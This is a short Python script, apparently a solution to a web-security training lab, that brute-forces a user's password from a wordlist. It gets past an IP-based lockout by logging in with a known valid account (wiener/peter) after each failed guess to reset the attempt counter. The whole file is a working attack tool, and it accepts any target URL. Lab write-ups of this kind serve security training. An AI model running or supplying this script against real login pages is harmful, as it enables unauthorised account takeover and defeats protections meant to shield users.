#!/usr/bin/env python3
# Broken brute-protection, IP block
# ---------------------------------
# Everytime, we got blocked. We login using our credentials
# To reset the block attempts.
# Keep looping until we found the correct credentials
import requests
import sys

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

MYUSER = "wiener"
MYPASS = "peter"

def pass_list(url, user, pass_path):
    with open(pass_path, 'r') as f:
        for passwords in f.readlines():
            password = passwords.replace('\n','')
            data = {'username':user, 'password':password}
            req = requests.post(url, data=data, verify=False, proxies=p)
            if "You have made too many incorrect login attempts." not in req.text and "Incorrect password" not in req.text:
                return password
            else:
                data = {'username':MYUSER, 'password':MYPASS}
                req = requests.post(url, data=data, verify=False, proxies=p)
            continue
        return False         

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        user = sys.argv[2].strip()
        password = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: {} <url> <user> <passwords>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com admin password".format(sys.argv[0]))
        sys.exit(1)

    print("[+] The username...  [{}]".format(user))
    print("[+] Enumerate the password...")
    passwd = pass_list(url, user, password)
    if passwd:
        print("[-] Found the password...    [{}]".format(passwd))